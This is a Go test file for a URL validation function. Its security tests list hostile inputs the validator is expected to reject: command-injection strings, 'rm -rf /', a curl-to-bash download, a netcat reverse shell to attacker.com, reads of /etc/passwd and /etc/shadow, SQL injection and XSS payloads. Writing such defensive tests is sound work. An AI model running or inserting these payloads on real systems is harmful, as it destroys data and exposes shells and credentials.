package validation

import (
	"strconv"
	"strings"
	"testing"
	"time"
)

func TestValidateURL(t *testing.T) {
	tests := []struct {
		name      string
		url       string
		expectErr bool
	}{
		// Valid URLs
		{
			name:      "valid http URL",
			url:       "http://localhost:8080",
			expectErr: false,
		},
		{
			name:      "valid https URL",
			url:       "https://example.com",
			expectErr: false,
		},
		{
			name:      "valid URL with port",
			url:       "http://127.0.0.1:3000",
			expectErr: false,
		},
		{
			name:      "valid URL with path",
			url:       "https://example.com/path/to/resource",
			expectErr: false,
		},
		{
			name:      "valid URL with query params",
			url:       "https://example.com?param=value",
			expectErr: false,
		},

		// Invalid schemes
		{
			name:      "javascript scheme",
			url:       "javascript:alert('xss')",
			expectErr: true,
		},
		{
			name:      "file scheme",
			url:       "file:///etc/passwd",
			expectErr: true,
		},
		{
			name:      "data scheme",
			url:       "data:text/html,<script>alert('xss')</script>",
			expectErr: true,
		},
		{
			name:      "ftp scheme",
			url:       "ftp://ftp.example.com",
			expectErr: true,
		},

		// Command injection attempts
		{
			name:      "semicolon injection",
			url:       "http://example.com; rm -rf /",
			expectErr: true,
		},
		{
			name:      "ampersand injection",
			url:       "http://example.com & cat /etc/passwd",
			expectErr: true,
		},
		{
			name:      "pipe injection",
			url:       "http://example.com | nc -l 1337",
			expectErr: true,
		},
		{
			name:      "backtick injection",
			url:       "http://example.com`whoami`",
			expectErr: true,
		},
		{
			name:      "dollar injection",
			url:       "http://example.com$(whoami)",
			expectErr: true,
		},
		{
			name:      "parentheses injection",
			url:       "http://example.com(echo test)",
			expectErr: true,
		},
		{
			name:      "redirect injection",
			url:       "http://example.com > /tmp/malicious",
			expectErr: true,
		},
		{
			name:      "quote injection single",
			url:       "http://example.com'",
			expectErr: true,
		},
		{
			name:      "quote injection double",
			url:       "http://example.com\"",
			expectErr: true,
		},
		{
			name:      "backslash injection",
			url:       "http://example.com\\",
			expectErr: true,
		},
		{
			name:      "newline injection",
			url:       "http://example.com\nrm -rf /",
			expectErr: true,
		},
		{
			name:      "carriage return injection",
			url:       "http://example.com\rrm -rf /",
			expectErr: true,
		},

		// Space injection
		{
			name:      "space injection",
			url:       "http://example.com rm -rf /",
			expectErr: true,
		},

		// Malformed URLs
		{
			name:      "malformed URL",
			url:       "not-a-url",
			expectErr: true,
		},
		{
			name:      "empty URL",
			url:       "",
			expectErr: true,
		},
		{
			name:      "URL without hostname",
			url:       "http://",
			expectErr: true,
		},
		{
			name:      "URL with only scheme",
			url:       "http:",
			expectErr: true,
		},

		// Edge cases
		{
			name:      "localhost",
			url:       "http://localhost",
			expectErr: false,
		},
		{
			name:      "IP address",
			url:       "http://192.168.1.1",
			expectErr: false,
		},
		{
			name:      "URL with fragment",
			url:       "https://example.com#section",
			expectErr: false,
		},
		{
			name:      "URL with encoded characters (safe)",
			url:       "https://example.com/path%20with%20spaces",
			expectErr: false,
		},
		{
			name:      "URL with multiple query parameters",
			url:       "https://example.com?param1=value1&param2=value2",
			expectErr: true, // Contains &
		},
		{
			name:      "very long valid URL",
			url:       "https://example.com/" + strings.Repeat("a", 2000),
			expectErr: false,
		},
		{
			name:      "URL with non-standard port",
			url:       "http://example.com:9999",
			expectErr: false,
		},
		{
			name:      "localhost with non-standard port",
			url:       "http://localhost:3000",
			expectErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateURL(tt.url)
			if tt.expectErr && err == nil {
				t.Errorf("ValidateURL(%q) expected error but got none", tt.url)
			}
			if !tt.expectErr && err != nil {
				t.Errorf("ValidateURL(%q) unexpected error: %v", tt.url, err)
			}
		})
	}
}

// TestValidateURL_SecurityFocus tests specific security-focused scenarios.
func TestValidateURL_SecurityFocus(t *testing.T) {
	// Test various command injection patterns that might be attempted
	maliciousURLs := []string{
		"http://example.com; curl http://malicious.com/script.sh | bash",
		"http://example.com && wget http://evil.com/backdoor",
		"http://example.com || echo 'injected'",
		"http://example.com`nc -e /bin/sh attacker.com 4444`",
		"http://example.com$(curl evil.com)",
		"http://example.com > /dev/null; rm -rf /",
		"http://example.com < /etc/passwd",
		"http://example.com\\'; DROP TABLE users; --",
		"javascript:alert(document.cookie)",
		"data:text/html,<img src=x onerror=alert('XSS')>",
		"file:///etc/shadow",
		"ftp://anonymous@malicious.com",
		// Additional advanced injection patterns
		"http://example.com%0Arm -rf /",         // URL-encoded newline
		"http://example.com%0D%0Awget evil.com", // CRLF injection
		"http://example.com\x00rm -rf /",        // Null byte injection
		"http://example.com\t&&\tcurl evil.com", // Tab characters
		"http://example.com#{curl evil.com}",    // Fragment injection
		"http://example.com/?$(whoami)",         // Query parameter injection
	}

	for i, maliciousURL := range maliciousURLs {
		testName := "malicious_" + strconv.Itoa(i)
		t.Run(testName, func(t *testing.T) {
			err := ValidateURL(maliciousURL)
			if err == nil {
				t.Errorf("ValidateURL should reject malicious URL: %q", maliciousURL)
			}
		})
	}
}

// TestValidateURL_Performance tests the performance characteristics of validation.
func TestValidateURL_Performance(t *testing.T) {
	longURL := "https://example.com/" + strings.Repeat("a", 10000)

	start := time.Now()
	err := ValidateURL(longURL)
	duration := time.Since(start)

	if err != nil {
		t.Errorf("Valid long URL should not fail validation: %v", err)
	}

	// Validation should be fast even for long URLs
	if duration > 10*time.Millisecond {
		t.Errorf("URL validation took too long: %v", duration)
	}
}

// BenchmarkValidateURL benchmarks the URL validation function.
func BenchmarkValidateURL(b *testing.B) {
	testURLs := []string{
		"http://localhost:8080",
		"https://example.com/path?param=value",
		"http://example.com; rm -rf /", // malicious
		"javascript:alert('xss')",      // malicious
	}

	b.ResetTimer()
	for range b.N {
		for _, url := range testURLs {
			_ = ValidateURL(url)
		}
	}
}
